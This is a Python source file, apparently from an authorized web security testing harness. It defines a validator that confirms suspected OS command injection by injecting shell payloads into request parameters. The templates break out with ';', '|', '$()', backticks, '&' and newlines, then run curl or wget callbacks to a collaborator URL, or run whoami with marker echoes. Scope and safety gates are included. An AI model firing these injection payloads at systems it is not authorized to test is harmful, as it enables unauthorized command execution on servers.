"""
OS command-injection confirmation leg (deterministic, OOB via the in-process
collaborator).

The command_injection agent can only GUESS that a parameter reaches a shell. This
proves it out-of-band the same way the SSRF/XXE legs do: inject a shell payload
whose only effect is to fetch a unique collaborator URL, send the request, and
watch for the target to CALL BACK. A callback is proof the injected command ran
-- confirmed command injection -- with zero reliance on the response body (blind
injection included) and without running any payload that reads, writes, or
destroys anything on the target (the fetch is the whole payload).

Fires on command_injection findings; injects into every query/body parameter.
Scope-gated; active (validators.active_enabled), and mutating replays of a non-GET
capture additionally need validators.allow_mutating_replay (safety gate).
"""
from __future__ import annotations

import secrets
import time
from urllib.parse import urlsplit

import httpx

import harness.collaborator as _collab
from harness import global_throttle
from harness.models import Finding, HttpExchange
from harness.safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked
from .base import SentAnswer, Validator, ValidationResult, artifact_id_of
from .injection_targets import (param_targets, mutate, replay_headers, select_targets,
                                coverage_note, tested_inputs)

# Shell metacharacters that break out of the surrounding command, tried in order.
# `{u}` is the collaborator URL. Covers POSIX (`;`, `|`, `$()`, backticks,
# newline) and Windows cmd (`&`), and both curl and wget as the fetch tool so the
# leg does not depend on which is installed. Each is a self-contained fetch: the
# callback alone is the signal, so no output needs to come back in-band.
_TEMPLATES = (
    ";curl -s {u}",
    ";wget -qO- {u}",
    "|curl -s {u}",
    "$(curl -s {u})",
    "`curl -s {u}`",
    "&curl -s {u}",
    "\ncurl -s {u}\n",
)
# Bound the fan-out: params x templates sends per finding.
_MAX_PARAMS = 6
# The expected marker is assembled by the shell from two separated pieces, so
# a plain reflector never contains it. POSIX `printf` joins an argument through
# `%s`; Windows cmd removes the caret escape before echoing.
_INBAND = (";whoami;printf {a}%s {b}", "|whoami;printf {a}%s {b}",
           "& whoami & echo {a}^{b}")
# BM-2: the same two pieces with the joining syntax but no command separator. A
# target that answers this with the joined marker transforms text (a sanitiser
# stripping `^`, a formatter expanding `%s`) instead of running a shell, so an
# in-band marker only confirms when its control comes back without it.
_INBAND_CONTROL = {_INBAND[0]: "{a}%s {b}", _INBAND[1]: "{a}%s {b}", _INBAND[2]: "{a}^{b}"}


async def _wait_for_any(collab, tokens: list[str], timeout: float) -> str | None:
    """The first of `tokens` the listener saw a callback for, after ONE wait of at
    most `timeout` seconds. A listener without `wait_for_any` is polled token by
    token against a shared deadline, each token getting an equal slice of what is
    left, so the total stays within `timeout`."""
    wait_any = getattr(collab, "wait_for_any", None)
    if wait_any is not None:
        return await wait_any(tokens, timeout=timeout)
    deadline = time.monotonic() + timeout
    for index, token in enumerate(tokens):
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        if await collab.wait_for_hit(token, timeout=remaining / (len(tokens) - index)):
            return token
    return None


class CommandInjectionValidator(Validator):
    name = "command_injection"
    finding_classes = {"command_injection", "command injection", "os command injection",
                       "rce", "remote code execution", "code injection", "shell injection"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0,
                 collaborator=None, run_context=None, oob_callbacks_enabled: bool = True):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self._collab = collaborator
        self.oob_callbacks_enabled = bool(oob_callbacks_enabled)
        self.run_context = run_context

    def collab(self):
        return _collab.resolve(self._collab)

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        return super().applies(finding, exchange) and bool(param_targets(exchange))

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "command_injection", summary=why)

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        from harness.scope_lock import host_in_scope
        if self.allowed_hosts and not host_in_scope(exchange.url, self.allowed_hosts, active_mode=True):
            return self._skip("target origin is out of scope")
        targets, coverage = select_targets(finding, param_targets(exchange), _MAX_PARAMS)
        if not targets:
            return self._skip("no parameter to inject a shell payload into")
        collab = self.collab() if self.oob_callbacks_enabled else None
        method = (exchange.method or "GET").upper()
        headers = replay_headers(exchange)
        session_ref = None
        request_headers = headers
        if self.run_context is not None:
            from .transport import bind_session
            session_ref, request_headers = bind_session(self.run_context, headers)

        # Every send that got no response, as ("blocked" | "error", description):
        # a check that never reached the target is not a negative (RV-L rule).
        unsent: list[tuple[str, str]] = []
        sends = 0

        async def send(url: str, body: str, label: str) -> tuple[str, str]:
            """("ok", text) when answered. Otherwise the send is recorded in
            `unsent` and the state is "refused" (scope, gate or budget), "error"
            (an in-run transport failure: the request may have been delivered,
            so the out-of-band wait still runs) or "failed" (a standalone one)."""
            nonlocal sends
            sends += 1
            if self.run_context is not None:
                from harness.run_context import TypedRequest
                outcome = await self.run_context.executor().execute(
                    TypedRequest(method, url, headers=request_headers, body=body or None),
                    capability=self.name, session_ref=session_ref,
                    case_ref=finding.finding_id or "", max_redirects=0)
                if not outcome.executed:
                    unsent.append(("blocked", f"{label}: refused ({outcome.outcome}"
                                   + (f": {outcome.error})" if outcome.error else ")")))
                    return "refused", ""
                if outcome.outcome == "error":
                    failure = (getattr(outcome.artifact, "transport_outcome", "")
                               .partition(":")[2] or outcome.error or "transport error")
                    unsent.append(("error", f"{label}: {failure}"))
                    return "error", ""
                return SentAnswer(("ok", outcome.body or ""), outcome.artifact_id)
            try:
                await global_throttle.acquire()
                async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                            follow_redirects=False, verify=False) as client:
                    resp = await client.request(method, url, headers=headers or None,
                                                content=body or None)
            except SafetyGateBlocked as e:
                unsent.append(("blocked", f"{label}: refused ({e.decision.reason})"))
                return "refused", ""
            except httpx.HTTPError as e:
                unsent.append(("error", f"{label}: {e.__class__.__name__}"))
                return "failed", ""
            return SentAnswer(("ok", resp.text), artifact_id_of(resp))

        async def proof_exchanges(loc: str, param: str, attack, marker_a: str, marker_b: str,
                                  control=None) -> dict:
            """Ticket 6 proof exchanges. Control: the same parameter given the
            marker pieces without shell syntax, named only when its answer lacks
            the joined marker; an in-band confirmation passes the control its
            verdict already used (BM-2). Baseline: the original request replayed,
            sent last so the target is left as captured. Outside a run neither is
            sent: it would name nothing."""
            if self.run_context is None:
                return {"attack": attack}
            if control is None:
                url, body = mutate(exchange, loc, param, f"{marker_a}%s {marker_b}")
                control = await send(url, body, "proof control")
                if control[0] != "ok" or marker_a + marker_b in control[1]:
                    control = None
            baseline = await send(exchange.url, exchange.request_body or "", "proof baseline")
            return {"baseline": baseline, "attack": attack, "controls": [control]}

        def incomplete() -> ValidationResult:
            answered = sends - len(unsent)
            refused = any(kind == "blocked" for kind, _ in unsent)
            failed = "; ".join(w for _, w in unsent[:4])
            return ValidationResult(
                self.name, "blocked" if refused and not answered else "inconclusive",
                "command_injection", confidence=0.0, confirmed=False,
                summary=f"Command-injection check incomplete: {len(unsent)} of {sends} send(s) got "
                        f"no response ({failed}); not a negative result",
                evidence=f"Tried {len(targets)} parameter(s); {answered} answered send(s) showed no "
                         f"command-output marker and no callback, but a send that never reached "
                         f"the target cannot show one.")

        # Prefer an in-band unique marker. Including `whoami` keeps the probe
        # read-only while exercising a real command and works on the canonical
        # stock-check command-injection shape. The nonce prevents ordinary
        # reflection or pre-existing page content from confirming the class.
        for loc, param in targets:
            token = secrets.token_hex(6)
            marker_a, marker_b = f"HV{token[:6]}", token[6:]
            marker = marker_a + marker_b
            for tmpl in _INBAND:
                payload = tmpl.format(a=marker_a, b=marker_b)
                url, body = mutate(exchange, loc, param, payload)
                sent = await send(url, body, f"in-band probe via {loc} {param!r}")
                state, text = sent
                if state == "refused":
                    return incomplete()  # the run or the gate refuses the remaining sends too
                if marker in text:
                    url, body = mutate(exchange, loc, param,
                                       _INBAND_CONTROL[tmpl].format(a=marker_a, b=marker_b))
                    control = await send(url, body, f"in-band control via {loc} {param!r}")
                    if control[0] == "refused":
                        return incomplete()
                    if control[0] != "ok" or marker in control[1]:
                        continue  # no differential: the text joined without a shell
                    proof = await proof_exchanges(loc, param, sent, marker_a, marker_b, control)
                    return ValidationResult(
                        self.name, "confirmed", "command_injection", confidence=0.95,
                        confirmed=True,
                        summary=f"OS command injection confirmed: the {loc} parameter {param!r} "
                                "executed a shell command.",
                        evidence=f"Injected `{tmpl.format(a='<nonce-a>', b='<nonce-b>')}` "
                                 f"into {param!r}; "
                                 "the response contained the unique command-output marker.",
                        tested_parameters=tested_inputs(finding, targets),
                    ).with_artifacts(**proof)

        # A loopback collaborator cannot be reached by a remote target. Avoid
        # multiplying the configured timeout across payloads when it cannot
        # produce evidence; explicit/external collaborators still cover blind
        # command injection.
        if collab is None:
            return ValidationResult(self.name, "inconclusive", "command_injection",
                                    summary="In-band check did not confirm; callback probes disabled by policy")
        collab_host = urlsplit(collab.url("reachability-check")).hostname or ""
        target_host = urlsplit(exchange.url).hostname or ""
        if collab_host in {"127.0.0.1", "localhost", "::1"} and target_host not in {
                "127.0.0.1", "localhost", "::1"}:
            if unsent:
                return incomplete()
            return ValidationResult(
                self.name, "inconclusive", "command_injection", confidence=0.0,
                confirmed=False,
                summary="Command-injection check incomplete: no in-band marker and the callback "
                        "listener is unreachable; not a negative result",
                evidence=f"Tried {len(targets)} parameter(s) across {len(_INBAND)} "
                         "in-band shell forms; loopback collaborator was not reachable from the target.")
        # A stopped listener can record nothing: sending would only spend requests.
        # (Unverified reachability is different -- an exact callback still proves the
        # probe -- so that case sends, and only an absent callback stays inconclusive.)
        if _collab.listener_stopped(collab):
            unavailable = _collab.unavailable_result(collab, exchange.url, self.name, "command_injection")
            if unavailable is not None:
                return incomplete() if unsent else unavailable
        # Send every out-of-band payload first, each with its own token, then wait
        # ONCE for any callback instead of one timed wait per payload.
        probes: dict[str, tuple[str, str, str, object]] = {}
        refused = False
        for loc, param in targets:
            for tmpl in _TEMPLATES:
                token = collab.token()
                payload = tmpl.format(u=collab.url(token))
                url, body = mutate(exchange, loc, param, payload)
                sent = await send(url, body, f"out-of-band probe via {loc} {param!r}")
                state, _ = sent
                if state == "refused":
                    # No point trying more templates, but the payloads already
                    # delivered can still call back: wait for them below (the
                    # refusal is in `unsent`, so no hit still ends incomplete).
                    refused = True
                    break
                if state == "failed":
                    continue
                probes[token] = (loc, param, tmpl, sent)
            if refused:
                break
        hit = await _wait_for_any(collab, list(probes), self.timeout) if probes else None
        if hit is not None:
            loc, param, tmpl, sent = probes[hit]
            nonce = secrets.token_hex(6)
            proof = await proof_exchanges(loc, param, sent, f"HV{nonce[:6]}", nonce[6:])
            return ValidationResult(
                self.name, "confirmed", "command_injection", confidence=0.95, confirmed=True,
                summary=f"OS command injection confirmed: a shell payload placed in the {loc} "
                        f"parameter {param!r} executed on the server.",
                evidence=f"Injected a metacharacter-prefixed fetch (`{tmpl.format(u='<collaborator>')}`) "
                         f"into {param!r}; the target ran it and called back out-of-band (blind-safe).",
                tested_parameters=tested_inputs(finding, targets),
            ).with_artifacts(**proof)
        if unsent:
            return incomplete()
        unavailable = _collab.unavailable_result(collab, exchange.url, self.name, "command_injection")
        if unavailable is not None:
            return unavailable
        return ValidationResult(
            self.name, "not_confirmed", "command_injection", confidence=0.0, confirmed=False,
            summary="No out-of-band callback observed -- parameters do not appear to reach a shell",
            evidence=f"Tried {len(targets)} parameter(s) x {len(_TEMPLATES)} shell payloads; "
                     f"no collaborator hit within the window. Waited once for {len(probes)} "
                     f"callback(s) (timeout {self.timeout:g} s)." + coverage_note(coverage, finding),
            control_outcome=coverage, tested_parameters=tested_inputs(finding, targets))
